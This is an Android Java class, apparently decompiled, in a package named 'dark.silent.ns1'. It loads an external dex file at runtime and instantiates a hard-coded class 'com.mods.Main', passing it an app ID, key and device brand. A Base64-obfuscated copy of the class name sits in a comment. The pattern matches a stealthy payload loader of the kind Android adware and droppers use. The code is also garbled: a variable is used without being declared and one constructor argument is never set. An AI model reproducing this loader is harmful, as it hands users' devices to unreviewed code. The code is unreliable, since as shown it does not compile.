package dark.silent.ns1;

import android.content.Context;
import android.os.Bundle;

import com.squareup.leakcanary.android.noop.BuildConfig;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.lang.reflect.Constructor;

public final class ZipClassRunner {
    public final String appId;
    public final String appKey;
    public final String phoneBrand;
    public Object externalClassInstance;
    public String e;
    public String f;
    private final byte[] className;
    private ClassLoader classLoader;

    public ZipClassRunner(String appId, String appKey, String phoneBrand) {
        this.appId = appId;
        this.appKey = appKey;
        if (phoneBrand == null) {
            phoneBrand = BuildConfig.VERSION_NAME;
        }
        this.phoneBrand = phoneBrand;
        //this.className = Base64.decode("Y29tLm1vZHMuTWFpbg==", 0);
        this.className = "com.mods.Main".getBytes();
        this.externalClassInstance = null;
        this.classLoader = null;
        this.e = null;
        this.f = null;
    }

    public final boolean hasExternalClassInstance() {
        return this.externalClassInstance != null;
    }

    public final boolean loadAndRunExternalClass(Context context, File file) {
        this.classLoader = new DexClassLoader(file.getAbsolutePath(), context.getDir("outmof", 0).getAbsolutePath(), null, context.getClassLoader());
        Bundle bundle = new Bundle();
        if (this.e != null) {
            bundle.putStringArray("EXTRA_META", new String[]{this.e, this.f});
        }
        try {
            Constructor[] constructors = this.classLoader.loadClass(new String(this.className)).getConstructors();
            r4 = new Object[3];
            r4[1] = new String[]{this.appId, this.appKey, this.phoneBrand};
            r4[2] = bundle;
            this.externalClassInstance = constructors[0].newInstance(r4);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
